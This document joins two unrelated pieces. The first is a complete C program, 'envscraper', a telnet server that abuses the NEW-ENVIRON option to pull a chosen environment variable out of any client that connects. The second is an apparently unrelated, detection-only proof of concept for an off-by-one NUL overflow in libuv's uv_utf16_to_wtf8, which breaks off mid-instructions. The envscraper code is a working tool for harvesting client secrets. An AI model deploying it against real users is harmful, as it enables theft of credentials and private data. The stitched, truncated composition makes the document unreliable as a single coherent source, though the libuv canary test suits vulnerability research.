/*
 *  Attempt to extract an environment variable from a telnet client.
 *  $ cc -o envscraper envscraper.c -Wall -Werror -Wextra -pedantic
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define IP_ADDRESS   htonl(0x7f000001)
#define PORT         htons(23232)

#define IAC          "\xff"
#define DO           "\xfd"
#define SB           "\xfa"
#define SE           "\xf0"
#define NEW_ENVIRON  "\x27"
#define SEND         "\x01"
#define USERVAR      "\x03"

static int server = -1, client = -1;

static void usage(FILE *stream)
{
	fprintf(stream, "usage: envscraper VARIABLE\n");
}

static int setup(void)
{
	int reuse = 1;
	struct sockaddr_in address = { .sin_family = AF_INET };
	socklen_t length = sizeof(address);

	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (server == -1) {
		perror("socket");
		return -1;
	}	

	if (setsockopt(server, SOL_SOCKET,
	               SO_REUSEADDR, &reuse, sizeof(reuse)) == -1) {
		perror("setsockopt: SO_REUSEADDR");
		return -1;
	}

	address.sin_addr.s_addr = IP_ADDRESS;
	address.sin_port        = PORT;

	if (bind(server, (struct sockaddr *)&address, sizeof(address)) == -1) {
		perror("bind");
		return -1;
	}

	if (listen(server, 1) == -1) {
		perror("listen");
		return -1;
	}

	client = accept(server, (struct sockaddr *)&address, &length);
	if (client == -1) {
		perror("accept");
		return -1;
	}	

	return 0;
}

static int serve(char *variable)
{
	const char accost[] = IAC DO NEW_ENVIRON;
	const char demand[] = IAC SB NEW_ENVIRON SEND USERVAR;
	const char end[]    = IAC SE;

	int count;
	size_t total = 0;
	char ransom[1024];
	struct timeval wait = { .tv_sec = 1 };

	if (send(client, accost, sizeof(accost) - 1, 0) == -1) {
		perror("send: accost");
		return -1;
	}

	if (send(client, demand, sizeof(demand) - 1, 0) == -1) {
		perror("send: demand");
		return -1;
	}

	if (send(client, variable, strlen(variable), 0) == -1) {
		perror("send: variable");
		return -1;
	}

	if (send(client, end, sizeof(end) - 1, 0) == -1) {
		perror("send: end");
		return -1;
	}

	if (setsockopt(client, SOL_SOCKET,
	               SO_RCVTIMEO, (const char *)&wait, sizeof(wait)) == -1) {
		perror("setsockopt: SO_RCVTIMEO");
		return -1;
	}

	while (total < sizeof(ransom)) {
		count = recv(client, ransom + total, sizeof(ransom) - total, 0);

		if (count == 0)
			break;

		if (count == -1) {
			if (errno == EWOULDBLOCK || errno == EAGAIN)
				break;

			perror("recv: ransom");
			return -1;
		}

		total += count;
	}

	if (write(STDOUT_FILENO, ransom, total) == -1) {
		perror("write: stdout");
		return -1;
	}

	return 0;
}

static void cleanup(void)
{
	if (client > -1)
		close(client);

	if (server > -1)
		close(server);
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		usage(stderr);
		return EXIT_FAILURE;
	}

	atexit(cleanup);

	if (setup() == -1)
		return EXIT_FAILURE;

	if (serve(argv[1]) == -1)
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}
--- END envscraper.c ---

### PoC

Tested on Windows 10 22H2 x64, Visual Studio 2022 Build Tools, libuv v1.x
HEAD.

This is a detection-only PoC — it places a canary byte after the buffer and
checks if the NUL overwrites it. No exploitation attempted.

**1. Build libuv:**

```cmd
git clone https://github.com/libuv/libuv.git
cd libuv && git checkout v1.x
mkdir build && cd build
cmake .. -G "NMake Makefiles" -DCMAKE_BUILD_TYPE=Release
-DBUILD_TESTING=OFF -DLIBUV_BUILD_SHARED=OFF
nmake
cd ..
```

**2. Save as `poc\poc.c`:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "uv.h"

#define CJK_CHAR 0x4E2D  /* U+4E2D (中) — 3 UTF-8 bytes */

static int test_overflow(size_t buf_size) {
  size_t num_chars = buf_size / 3;
  char *mem = (char *)malloc(buf_size + 16);
  uint16_t *utf16 = (uint16_t *)malloc(num_chars * sizeof(uint16_t));
  char *target;
  size_t target_len;
  unsigned char canary;
  int rc;

  if (!mem || !utf16) { free(mem); free(utf16); return -1; }

  memset(mem, 0xAA, buf_size + 16);
  for (size_t i = 0; i < num_chars; i++)
    utf16[i] = CJK_CHAR;

  target = mem;
  target_len = buf_size;  /* reproduces the tty.c:558 pattern — no -1 */
  rc = uv_utf16_to_wtf8(utf16, (ssize_t)num_chars, &target, &target_len);
  canary = (unsigned char)mem[buf_size];

  printf("  buf=%-5zu chars=%-4zu rc=%-3d byte_after=0x%02X %s\n",
         buf_size, num_chars, rc, canary,
         canary == 0x00 ? "OVERFLOW" : "ok");

  free(utf16);
  free(mem);
  return canary == 0x00 ? 1 : 0;
}

int main(void) {
  size_t sizes[] = {48, 96, 192, 384, 768, 1536, 3072, 6144};
  int n = sizeof(sizes) / sizeof(sizes[0]);
  int hits = 0;

  printf("=== uv_utf16_to_wtf8() off-by-one PoC ===\n\n");
  printf("Test: buffer sizes divisible by 3 (should overflow):\n");
  for (int i = 0; i < n; i++)
    hits += test_overflow(sizes[i]);

  printf("\nControl: buffer size NOT divisible by 3:\n");
  test_overflow(100);

  printf("\n%s: %d/%d overflows detected\n",
         hits > 0 ? "VULNERABLE" : "NOT VULNERABLE", hits, n);
  return hits > 0 ? 1 : 0;
}
```

**3. Compile and run (from x64 Native Tools Command Prompt for VS 2022):**

```cmd
